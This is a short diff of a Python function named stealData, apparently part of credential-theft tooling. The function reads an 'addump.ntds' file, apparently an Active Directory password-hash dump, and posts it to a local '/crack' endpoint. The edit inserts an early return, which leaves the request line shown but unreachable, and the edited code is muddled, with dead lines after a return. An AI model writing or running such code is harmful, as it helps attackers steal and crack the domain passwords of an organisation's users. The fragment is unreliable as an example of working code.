@@ -68,12 +68,17 @@ def stealData():
     # read addump.ntds file
     with open('addump.ntds', 'rb') as f:
         ntds = f.read()
+        return ntds
+
+        
         # send the data with a post request to localhost:8081
         r = requests.post('http://localhost:8081/crack', data={'dump': ntds})
+
+
         # return the response
         return r.text
 
-        return ntds
+        
     
 
 if __name__ == "__main__":
